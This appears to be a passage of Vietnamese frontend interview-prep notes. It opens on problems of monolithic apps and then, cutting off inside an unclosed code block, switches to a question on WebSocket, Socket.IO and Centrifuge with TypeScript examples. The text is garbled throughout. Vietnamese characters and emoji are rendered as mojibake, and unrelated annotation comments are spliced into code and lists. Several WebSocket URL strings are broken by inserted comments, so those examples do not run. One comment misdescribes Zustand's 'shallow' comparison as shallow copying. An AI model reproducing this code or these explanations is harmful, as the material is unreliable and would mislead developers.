‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ         MONOLITHIC DEPLOYMENT NIGHTMARE                   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                           ‚îÇ
‚îÇ  Team A fix bug nh·ªè trong ProductCatalog (1 d√≤ng code)  ‚îÇ
‚îÇ              ‚Üì                                            ‚îÇ
‚îÇ  ‚ùå Ph·∫£i build TO√ÄN B·ªò app (15-20 ph√∫t)                 ‚îÇ
‚îÇ  ‚ùå Test TO√ÄN B·ªò app (2-3 gi·ªù)                          ‚îÇ
‚îÇ  ‚ùå Deploy TO√ÄN B·ªò app ‚Üí risk cho t·∫•t c·∫£ teams!         ‚îÇ
‚îÇ  ‚ùå N·∫øu c√≥ bug ‚Üí TO√ÄN B·ªò app down!                      ‚îÇ
‚îÇ                                                           ‚îÇ
‚îÇ  Timeline:                                                ‚îÇ
‚îÇ  ‚îú‚îÄ 10:00 AM: Team A commit fix                         ‚îÇ
‚îÇ  ‚îú‚îÄ 10:20 AM: Build xong (20 ph√∫t)                      ‚îÇ
‚îÇ  ‚îú‚îÄ 01:00 PM: QA test xong (2h 40 ph√∫t)                 ‚îÇ
‚îÇ  ‚îú‚îÄ 02:00 PM: Deploy production                         ‚îÇ
‚îÇ  ‚îî‚îÄ 02:30 PM: Rollback v√¨ bug t·ª´ Team C! ‚ùå             ‚îÇ
‚îÇ                                                           ‚îÇ
‚îÇ  ‚è±Ô∏è T·ªïng: 4.5 gi·ªù cho 1 thay ƒë·ªïi nh·ªè!                   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**‚ùå V·∫•n ƒê·ªÅ 2: TEAM CONFLICTS (Xung ƒê·ªôt Gi·ªØa Teams)**

```typescript
// ‚ùå Team A: Mu·ªën d√πng React 18 + TypeScript strict
// ‚ùå Team B: V·∫´n ƒëang d√πng React 17 (legacy code)
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: ‚ùå Team D: Mu·ªën migrate t·ª´ Redux ‚Üí Zustand

// K·∫øt qu·∫£: KH√îNG AI ƒê∆Ø·ª¢C L√ÄM G√å C·∫¢!
// ‚Üí Ph·∫£i h·ªçp 6 teams ƒë·ªÉ ƒë·ªìng √Ω 1 quy·∫øt ƒë·ªãnh
// ‚Üí M·∫•t 2-3 tu·∫ßn ch·ªâ ƒë·ªÉ quy·∫øt ƒë·ªãnh upgrade React
// ‚Üí Team C kh√¥ng ƒë∆∞·ª£c d√πng Svelte ‚Üí frustrated ‚Üí ngh·ªâ vi·ªác üò¢
```

**‚ùå V·∫•n ƒê·ªÅ 3: SLOW BUILD TIME (Build Ch·∫≠m)**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              BUILD TIME COMPARISON                        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                           ‚îÇ
‚îÇ  MONOLITHIC (1 app l·ªõn):                                 ‚îÇ
‚îÇ  ‚îú‚îÄ npm install: 8-10 ph√∫t (500 dependencies)           ‚îÇ
‚îÇ  ‚îú‚îÄ Build: 15-20 ph√∫t                                    ‚îÇ
‚îÇ  ‚îú‚îÄ Hot reload: 5-10 gi√¢y (ch·∫≠m!)                       ‚îÇ
‚îÇ  ‚îî‚îÄ Dev server start: 2-3 ph√∫t                          ‚îÇ
‚îÇ                                                           ‚îÇ
‚îÇ  ‚è±Ô∏è Developer experience: R·∫§T T·ªÜ!                        ‚îÇ
‚îÇ  üò¢ Devs ph·∫£i ƒë·ª£i 10s m·ªói l·∫ßn save code                  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**‚ùå V·∫•n ƒê·ªÅ 4: MERGE CONFLICTS (Xung ƒê·ªôt Merge)**

```bash
---
## 45. üîå Q45: WebSocket & Real-time Streaming - WebSocket, Socket.IO, Centrifuge  

**P1: T√™n c√¢u h·ªèi:** üîå Q45: WebSocket & Real-time Streaming - WebSocket, Socket.IO, Centrifuge  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"WebSocket = persistent bidirectional TCP connection cho real-time data. Socket.IO = WebSocket wrapper v·ªõi auto-reconnect + rooms. Centrifuge = scalable pub/sub v·ªõi Redis for enterprise."**

**üîë 3 Technologies:**

**1. Native WebSocket API:**
- **Protocol**: `ws://` (unencrypted) ho·∫∑c `wss://` (SSL/TLS)
- **Persistent connection** - 1 handshake, reuse m√£i
- **Bidirectional** - server push data b·∫•t c·ª© l√∫c n√†o
- Use case: Trading platforms (real-time prices), chat, live notifications
- ∆Øu ƒëi·ªÉm: Low latency (~50ms), less bandwidth than polling

**2. Socket.IO (High-Level Library):**
- **Auto-reconnect** khi connection lost
- **Fallback mechanisms**: WebSocket ‚Üí HTTP long-polling (n·∫øu WS blocked)
- **Rooms & Namespaces**: Organize connections (chat rooms, user-specific channels)
- **Broadcasting**: Send message to all/specific clients
- **Event-based API**: `socket.emit('event', data)` - cleaner than raw messages

**3. Centrifuge (Scalable Pub/Sub):**
- **Horizontal scaling** - multiple server instances share state via **Redis**
- **Channel subscriptions**: Client subscribe channels, server publish to channels
- **Presence**: Track online users in channels
- **History**: Replay missed messages (offline ‚Üí online)
- Use case: Large-scale systems (>10k concurrent connections)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Kh√¥ng handle reconnection ‚Üí connection lost = app broken
- Send large payloads ‚Üí slow, d√πng binary (ArrayBuffer) thay JSON
- Kh√¥ng authenticate WS connections ‚Üí security risk
- Memory leak: kh√¥ng cleanup event listeners khi disconnect

**üí° Ki·∫øn Th·ª©c Senior:**
- **WebSocket vs SSE**: SSE = server ‚Üí client only (simpler), WS = bidirectional
- **Heartbeat/Ping-Pong**: Detect dead connections (send ping every 30s, expect pong)
- **Binary frames**: `ws.send(arrayBuffer)` nhanh h∆°n JSON strings (~40%)
- **Backpressure**: Client slow consume ‚Üí buffer overflow, implement flow control
- **Load balancing**: Sticky sessions (same client ‚Üí same server) or Redis pub/sub share state

**‚ö° Quick Summary:**
> WebSocket = persistent connection, real-time bidirectional communication. Socket.IO = WebSocket + fallback + rooms. Centrifuge = scalable real-time messaging v·ªõi Redis

**üí° Ghi Nh·ªõ:**
- üåê **WebSocket**: Native browser API, low-level, persistent TCP connection
- üîå **Socket.IO**: High-level library, auto-reconnect, fallback to polling
- üì° **Centrifuge**: Enterprise solution, horizontal scaling, Redis pub/sub
- ‚ö° **Use Case**: Trading (real-time price), Chat, Live dashboard, Notifications

**Tr·∫£ l·ªùi:**

#### **Ph·∫ßn 1: WebSocket Basics**

**üí° WebSocket l√† g√¨?**

WebSocket l√† giao th·ª©c **persistent, bidirectional** communication gi·ªØa client v√† server qua **single TCP connection**.

**T·∫°i sao d√πng WebSocket thay v√¨ REST API Polling?**

```typescript
// ‚ùå REST API Polling - KH√îNG hi·ªáu qu·∫£
setInterval(() => {
  fetch('/api/market-data')
    .then(res => res.json())
    .then(data => updateUI(data));
}, 1000); // Call API m·ªói gi√¢y!

/**
 * V·∫§N ƒê·ªÄ:
 * - T·ªën bƒÉng th√¥ng: M·ªói request = headers + body
 * - Latency cao: HTTP handshake m·ªói l·∫ßn
 * - Server load cao: 1000 clients = 1000 requests/gi√¢y
 * - Kh√¥ng real-time: Delay t·ªëi thi·ªÉu 1 gi√¢y
 * - Waste resources: Poll ngay c·∫£ khi kh√¥ng c√≥ data m·ªõi
 */

// ‚úÖ WebSocket - Real-time hi·ªáu qu·∫£
const ws = new WebSocket('wss: // Ch√∫ gi·∫£i: market-data.example.com');

ws.onopen = () => {
  console.log('‚úÖ Connected');
 // Ch√∫ gi·∫£i: Subscribe to channels
  ws.send(JSON.stringify({ 
    type: 'subscribe', 
    symbols: ['VNM', 'HPG', 'VIC'] 
  }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  updateUI(data); // ‚ö° Update ngay khi c√≥ data m·ªõi
};

/**
 * ∆ØU ƒêI·ªÇM:
 * ‚úÖ Persistent connection: K·∫øt n·ªëi 1 l·∫ßn, d√πng m√£i
 * ‚úÖ Push data ngay l·∫≠p t·ª©c: Latency < 10ms
 * ‚úÖ Ti·∫øt ki·ªám bƒÉng th√¥ng: Kh√¥ng c√≥ HTTP headers l·∫∑p l·∫°i
 * ‚úÖ Server load th·∫•p: Ch·ªâ push khi c√≥ data m·ªõi
 * ‚úÖ True real-time: Kh√¥ng c√≥ polling delay
 */
```

**WebSocket Lifecycle:**

```typescript
 // Ch√∫ gi·∫£i: 1. CONNECTING (readyState = 0)
const ws = new WebSocket('wss: // Ch√∫ gi·∫£i: api.example.com/stream');
console.log('State:', ws.readyState); // Ch√∫ gi·∫£i: 0 - CONNECTING

 // Ch√∫ gi·∫£i: 2. OPEN (readyState = 1)
ws.onopen = () => {
  console.log('State:', ws.readyState); // Ch√∫ gi·∫£i: 1 - OPEN
  console.log('‚úÖ Connected, c√≥ th·ªÉ g·ª≠i message');
  
 // Ch√∫ gi·∫£i: Send subscribe message
  ws.send(JSON.stringify({ 
    type: 'subscribe', 
    symbols: ['BTCUSDT', 'ETHUSDT'] 
  }));
};

 // Ch√∫ gi·∫£i: 3. MESSAGE - Nh·∫≠n data t·ª´ server
ws.onmessage = (event: MessageEvent) => {
  const data = JSON.parse(event.data);
  console.log('üì• Received:', data);
  
 // Ch√∫ gi·∫£i: Update UI
  updateTickerPrice(data.symbol, data.price);
};

// 4. ERROR - X·ª≠ l√Ω l·ªói
ws.onerror = (error) => {
  console.error('‚ùå WebSocket error:', error);
  showNotification('Connection error. Retrying...');
};

 // Ch√∫ gi·∫£i: 5. CLOSE (readyState = 3)
ws.onclose = (event: CloseEvent) => {
  console.log('State:', ws.readyState); // Ch√∫ gi·∫£i: 3 - CLOSED
  console.log('Code:', event.code);
  console.log('Reason:', event.reason);
  
  /**
   * CLOSE CODES:
   * 1000: Normal closure
   * 1001: Going away (page refresh)
   * 1006: Abnormal closure (no close frame)
   * 1008: Policy violation (auth error)
   * 1011: Server error
   */
  
 // Ch√∫ gi·∫£i: Reconnect logic
  if (shouldReconnect(event.code)) {
    scheduleReconnect();
  }
};

 // Ch√∫ gi·∫£i: Cleanup khi unmount
useEffect(() => {
  const ws = new WebSocket(url);
  
  return () => {
    ws.close(1000, 'Component unmounted'); // Ch√∫ gi·∫£i: ‚úÖ Clean close
  };
}, [url]);
```

---

#### **Ph·∫ßn 2: Production WebSocket Architecture**

**Pattern 1: Reference Counting Subscription Manager**

```typescript
/**
 * PROBLEM: Multiple components subscribe to same symbol
 * 
 * Component A: Subscribe VNM
 * Component B: Subscribe VNM
 * Component C: Subscribe HPG
 * 
 * ‚ùå BAD: 3 WebSocket connections (waste resources)
 * ‚úÖ GOOD: 1 connection, reference counting
 */

interface SubscriptionTracker {
  subscriptions: Map<string, {
    count: number;
    subscribers: Set<string>;
  }>;
}

class LiveDataManager {
  private ws: WebSocket | null = null;
  private tracker = new Map<string, { count: number; subscribers: Set<string> }>();

  subscribe(symbols: string[], componentId: string) {
    symbols.forEach(symbol => {
      const current = this.tracker.get(symbol);

      if (!current) {
 // Ch√∫ gi·∫£i: üî• First subscriber ‚Üí Send subscribe message
        this.tracker.set(symbol, {
          count: 1,
          subscribers: new Set([componentId])
        });
        
        this.ws?.send(JSON.stringify({
          type: 'subscribe',
          symbol
        }));
      } else {
 // Ch√∫ gi·∫£i: ‚ö° Already subscribed ‚Üí Just increment counter
        current.count++;
        current.subscribers.add(componentId);
        
        // Kh√¥ng g·ª≠i subscribe message n·ªØa!
      }
    });

    return componentId;
  }

  unsubscribe(componentId: string) {
    this.tracker.forEach((data, symbol) => {
      if (data.subscribers.has(componentId)) {
        data.subscribers.delete(componentId);
        data.count--;

        if (data.count === 0) {
 // Ch√∫ gi·∫£i: üóëÔ∏è No more subscribers ‚Üí Unsubscribe
          this.tracker.delete(symbol);
          
          this.ws?.send(JSON.stringify({
            type: 'unsubscribe',
            symbol
          }));
        }
      }
    });
  }
}

/**
 * TIMELINE EXAMPLE:
 * 
 * Time | Event                    | VNM count | Action
 * -----|--------------------------|-----------|------------------
 * T0   | Component A mounts       | 0 ‚Üí 1     | ‚úÖ Send subscribe
 * T1   | Component B mounts       | 1 ‚Üí 2     | ‚ö° Reuse connection
 * T2   | Component C mounts       | 2 ‚Üí 3     | ‚ö° Reuse connection
 * T3   | Component A unmounts     | 3 ‚Üí 2     | ‚úã Keep connection
 * T4   | Component B unmounts     | 2 ‚Üí 1     | ‚úã Keep connection
 * T5   | Component C unmounts     | 1 ‚Üí 0     | üóëÔ∏è Unsubscribe, close
 */
```

**Pattern 2: Zustand Store Integration**

```typescript
 // Ch√∫ gi·∫£i: File: lib/live-data-manager/stores/useLiveDataStore.ts

interface TickerData {
  symbol: string;
  lastPrice: number;
  change: number;
  volume: number;
  timestamp: number;
}

interface LiveDataStore {
  tickerData: Record<string, TickerData>;
  updateTickerData: (data: TickerData) => void;
  batchUpdate: (updates: TickerData[]) => void;
}

const useLiveDataStore = create<LiveDataStore>((set) => ({
  tickerData: {},
  
 // Ch√∫ gi·∫£i: Update single ticker
  updateTickerData: (data) => set((state) => ({
    tickerData: {
      ...state.tickerData,
      [data.symbol]: data
    }
  })),
  
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
  batchUpdate: (updates) => set((state) => {
    const newData = { ...state.tickerData };
    updates.forEach(data => {
      newData[data.symbol] = data;
    });
    return { tickerData: newData };
  })
}));

 // Ch√∫ gi·∫£i: WebSocket message handler
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  
  if (Array.isArray(data)) {
 // Ch√∫ gi·∫£i: Batch update
    useLiveDataStore.getState().batchUpdate(data);
  } else {
 // Ch√∫ gi·∫£i: Single update
    useLiveDataStore.getState().updateTickerData(data);
  }
};
```

**Pattern 3: React Hook Integration**

```typescript
 // Ch√∫ gi·∫£i: File: lib/live-data-manager/hooks/useLiveMarketData.ts

const useLiveMarketData = () => {
  const wsRef = useRef<WebSocket | null>(null);
  const updateStore = useLiveDataStore(state => state.updateTickerData);

  useEffect(() => {
    const ws = new WebSocket('wss: // Ch√∫ gi·∫£i: market.example.com/stream');
    wsRef.current = ws;

    ws.onopen = () => {
      console.log('‚úÖ WebSocket connected');
 // Ch√∫ gi·∫£i: Re-subscribe to active symbols after reconnect
      const activeSymbols = getActiveSubscriptions();
      if (activeSymbols.length > 0) {
        ws.send(JSON.stringify({
          type: 'subscribe',
          symbols: activeSymbols
        }));
      }
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      updateStore(data); // Ch√∫ gi·∫£i: Update Zustand store
    };

    ws.onerror = (error) => {
      console.error('‚ùå WebSocket error:', error);
    };

    ws.onclose = (event) => {
      console.log('üîå WebSocket closed:', event.code);
 // Ch√∫ gi·∫£i: Auto-reconnect
      if (shouldReconnect(event.code)) {
        setTimeout(() => {
          console.log('üîÑ Reconnecting...');
 // Ch√∫ gi·∫£i: Re-run effect to reconnect
        }, getReconnectDelay());
      }
    };

    return () => {
      ws.close(1000, 'Component cleanup');
    };
  }, []);

  return wsRef;
};

 // Ch√∫ gi·∫£i: Component usage
const StockWatchlist = () => {
 // Ch√∫ gi·∫£i: Initialize WebSocket manager
  useLiveMarketData();

 // Ch√∫ gi·∫£i: Subscribe to symbols
  useSubscribeTickers('ticker', ['VNM', 'HPG', 'VIC']);

 // Ch√∫ gi·∫£i: Get data from store (selective subscription)
  const tickerData = useLiveDataStore(
    state => state.tickerData,
    shallow // Shallow compare ƒë·ªÉ avoid unnecessary re-renders
  );

  return (
    <div>
      {Object.entries(tickerData).map(([symbol, data]) => (
        <StockRow key={symbol} symbol={symbol} data={data} />
      ))}
    </div>
  );
};
```

---

#### **Ph·∫ßn 3: Performance Optimization**

**Optimization 1: Throttling v·ªõi requestAnimationFrame**

```typescript
/**
 * PROBLEM: Nh·∫≠n 1000 updates/gi√¢y t·ª´ WebSocket
 * SOLUTION: Throttle UI updates v·ªõi requestAnimationFrame (60fps)
 */

const useThrottledWebSocket = () => {
  const [data, setData] = useState<TickerData | null>(null);
  const latestDataRef = useRef<TickerData | null>(null);
  const rafIdRef = useRef<number | null>(null);

  // Update UI loop - ch·∫°y t·ªëi ƒëa 60fps
  const updateUI = useCallback(() => {
    if (latestDataRef.current) {
      setData(latestDataRef.current); // Ch√∫ gi·∫£i: Update state
      latestDataRef.current = null; // Ch√∫ gi·∫£i: Clear
    }
    rafIdRef.current = requestAnimationFrame(updateUI);
  }, []);

  useEffect(() => {
 // Ch√∫ gi·∫£i: Start animation loop
    rafIdRef.current = requestAnimationFrame(updateUI);

    return () => {
      if (rafIdRef.current) {
        cancelAnimationFrame(rafIdRef.current);
      }
    };
  }, [updateUI]);

 // Ch√∫ gi·∫£i: WebSocket message handler
  const onMessage = useCallback((event: MessageEvent) => {
    const parsed = JSON.parse(event.data);
    
    // ‚ö° Ch·ªâ store data, KH√îNG update state ngay
    // ƒê·ª£i RAF cycle ti·∫øp theo
    latestDataRef.current = parsed;
  }, []);

  return { data, onMessage };
};

/**
 * RESULT:
 * ‚ùå Before: 1000 updates/gi√¢y ‚Üí Lag UI, high CPU
 * ‚úÖ After: 60 updates/gi√¢y ‚Üí Smooth, low CPU
 */
```

**Optimization 2: Selective Re-rendering**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Update entire store ‚Üí All components re-render
const useLiveDataStore = create((set) => ({
  tickers: {},
  updateAll: (newTickers) => set({ tickers: newTickers })
  // T·∫•t c·∫£ components subscribe tickers s·∫Ω re-render!
}));

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Selective update + selector
const useLiveDataStore = create((set) => ({
  tickers: {},
  updateTicker: (symbol, data) => set((state) => ({
    tickers: {
      ...state.tickers,
      [symbol]: data // Ch√∫ gi·∫£i: Ch·ªâ update 1 symbol
    }
  }))
}));

// Component ch·ªâ subscribe symbol m√¨nh c·∫ßn
const StockRow = ({ symbol }) => {
  const data = useLiveDataStore(
    state => state.tickers[symbol], // Ch√∫ gi·∫£i: ‚ö° Selector - ch·ªâ l·∫•y 1 symbol
    shallow // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n; object l·ªìng b√™n trong v·∫´n gi·ªØ tham chi·∫øu chung.
  );

  // ‚úÖ Ch·ªâ re-render khi symbol n√†y update
  // ‚ùå Kh√¥ng re-render khi symbols kh√°c update
};
```

**Optimization 3: Virtual Scrolling**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Render all 1000 rows
const Watchlist = ({ data }) => {
  return data.map(item => <StockRow data={item} />); 
 // Ch√∫ gi·∫£i: 1000 DOM nodes ‚Üí Slow render, high memory
};

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Virtual scrolling with AG Grid
import { AgGridReact } from 'ag-grid-react';

const Watchlist = ({ data }) => {
  const columnDefs = useMemo(() => [
    { field: 'symbol', headerName: 'Symbol' },
    { field: 'lastPrice', headerName: 'Price' },
    { field: 'change', headerName: 'Change' }
  ], []);

  return (
    <AgGridReact
      rowData={data}
      columnDefs={columnDefs}
      // AG Grid t·ª± ƒë·ªông d√πng virtual scrolling
      // Ch·ªâ render ~20 visible rows thay v√¨ 1000
    />
  );
};

/**
 * PERFORMANCE:
 * ‚ùå No virtual scrolling: 1000 rows ‚Üí 500ms render
 * ‚úÖ Virtual scrolling: 20 rows ‚Üí 16ms render (60fps)
 */
```

**Optimization 4: Batch Updates**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Update t·ª´ng ticker m·ªôt
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  updateTicker(data.symbol, data); // Ch√∫ gi·∫£i: 100 calls ‚Üí 100 re-renders
};

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Batch updates
let batchQueue: TickerData[] = [];
let batchTimer: NodeJS.Timeout | null = null;

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  batchQueue.push(data);

  if (!batchTimer) {
    batchTimer = setTimeout(() => {
 // Ch√∫ gi·∫£i: Batch update after 16ms (60fps)
      batchUpdateTickers(batchQueue);
      batchQueue = [];
      batchTimer = null;
    }, 16);
  }
};

 // Ch√∫ gi·∫£i: 100 updates ‚Üí 1 batch update ‚Üí 1 re-render
```

---

#### **Ph·∫ßn 4: Error Handling & Reconnection**

**Exponential Backoff Reconnection:**

```typescript
class ResilientWebSocket {
  private ws: WebSocket | null = null;
  private url: string;
  private reconnectAttempts = 0;
  private maxAttempts = 5;
  private baseDelay = 1000; // Ch√∫ gi·∫£i: 1 second
  private activeSubscriptions: string[] = [];

  constructor(url: string) {
    this.url = url;
    this.connect();
  }

  connect() {
    try {
      this.ws = new WebSocket(this.url);

      this.ws.onopen = () => {
        console.log('‚úÖ Connected');
        this.reconnectAttempts = 0; // Ch√∫ gi·∫£i: Reset counter

 // Ch√∫ gi·∫£i: Re-subscribe to previous channels
        this.resubscribeAll();
      };

      this.ws.onmessage = this.handleMessage.bind(this);

      this.ws.onerror = (error) => {
        console.error('‚ùå WebSocket error:', error);
      };

      this.ws.onclose = (event) => {
        console.log(`üîå Closed: ${event.code} - ${event.reason}`);

        if (this.shouldReconnect(event.code)) {
          this.scheduleReconnect();
        } else {
          this.notifyUser('Connection closed. Please refresh.');
        }
      };
    } catch (error) {
      console.error('Failed to create WebSocket:', error);
      this.scheduleReconnect();
    }
  }

  private shouldReconnect(code: number): boolean {
 // Ch√∫ gi·∫£i: Normal closure or auth errors ‚Üí Don't reconnect
    if (code === 1000 || code === 1008) return false;

 // Ch√∫ gi·∫£i: Max attempts reached
    if (this.reconnectAttempts >= this.maxAttempts) {
      console.error('‚ùå Max reconnection attempts reached');
      return false;
    }

    return true;
  }

  private scheduleReconnect() {
 // Ch√∫ gi·∫£i: Exponential backoff: 1s, 2s, 4s, 8s, 16s
    const delay = this.baseDelay * Math.pow(2, this.reconnectAttempts);

    console.log(
      `üîÑ Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts + 1}/${this.maxAttempts})`
    );

    setTimeout(() => {
      this.reconnectAttempts++;
      this.connect();
    }, delay);
  }

  private resubscribeAll() {
    if (this.activeSubscriptions.length > 0) {
      this.ws?.send(JSON.stringify({
        type: 'subscribe',
        symbols: this.activeSubscriptions
      }));
    }
  }

  subscribe(symbols: string[]) {
    this.activeSubscriptions = [...new Set([...this.activeSubscriptions, ...symbols])];
    
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify({
        type: 'subscribe',
        symbols
      }));
    }
  }

  private handleMessage(event: MessageEvent) {
    const data = JSON.parse(event.data);
 // Ch√∫ gi·∫£i: Process message
  }

  close() {
    this.ws?.close(1000, 'Normal closure');
  }
}

/**
 * RECONNECTION TIMELINE:
 * 
 * T0: Connection lost
 * T0 + 1s: Attempt 1 (baseDelay * 2^0)
 * T0 + 3s: Attempt 2 (baseDelay * 2^1 = 2s)
 * T0 + 7s: Attempt 3 (baseDelay * 2^2 = 4s)
 * T0 + 15s: Attempt 4 (baseDelay * 2^3 = 8s)
 * T0 + 31s: Attempt 5 (baseDelay * 2^4 = 16s) - Final
 */
```

**Connection Status UI:**

```typescript
const ConnectionStatus = () => {
  const [status, setStatus] = useState<'connected' | 'connecting' | 'disconnected'>('connecting');
  const [reconnectAttempt, setReconnectAttempt] = useState(0);

  useEffect(() => {
    const ws = getWebSocketInstance();

    const handleOpen = () => {
      setStatus('connected');
      setReconnectAttempt(0);
    };

    const handleClose = () => {
      setStatus('disconnected');
    };

    const handleReconnecting = (attempt: number) => {
      setStatus('connecting');
      setReconnectAttempt(attempt);
    };

    ws.addEventListener('open', handleOpen);
    ws.addEventListener('close', handleClose);
    ws.addEventListener('reconnecting', handleReconnecting);

    return () => {
      ws.removeEventListener('open', handleOpen);
      ws.removeEventListener('close', handleClose);
      ws.removeEventListener('reconnecting', handleReconnecting);
    };
  }, []);

  return (
    <div className={`connection-status ${status}`}>
      {status === 'connected' && (
        <span className="text-green-500">üü¢ Connected</span>
      )}
      {status === 'connecting' && (
        <span className="text-yellow-500">
          üü° Connecting... {reconnectAttempt > 0 && `(Attempt ${reconnectAttempt}/5)`}
        </span>
      )}
      {status === 'disconnected' && (
        <span className="text-red-500">
          üî¥ Disconnected
          <button onClick={() => window.location.reload()}>
            Refresh
          </button>
        </span>
      )}
    </div>
  );
};
```

---

#### **Ph·∫ßn 5: Socket.IO - High-Level WebSocket Library**

**Socket.IO Features:**

```typescript
/**
 * SOCKET.IO = WebSocket + Fallback + Rooms + Auto-reconnect + Binary support
 * 
 * ‚úÖ Advantages:
 * - Auto-reconnection with exponential backoff
 * - Fallback to HTTP long-polling (IE11, corporate firewalls)
 * - Rooms & Namespaces (multi-tenancy)
 * - Acknowledgements (confirm message received)
 * - Binary support (images, files)
 * - Broadcasting
 * 
 * ‚ùå Disadvantages:
 * - Heavier than native WebSocket (~50KB)
 * - Not compatible with standard WebSocket servers
 * - Requires Socket.IO server
 */

 // Ch√∫ gi·∫£i: Client
import { io } from 'socket.io-client';

const socket = io('https: // Ch√∫ gi·∫£i: api.example.com', {
 // Ch√∫ gi·∫£i: Auto-reconnection
  reconnection: true,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000,
  reconnectionAttempts: 5,
  
 // Ch√∫ gi·∫£i: Timeout
  timeout: 20000,
  
 // Ch√∫ gi·∫£i: Transports
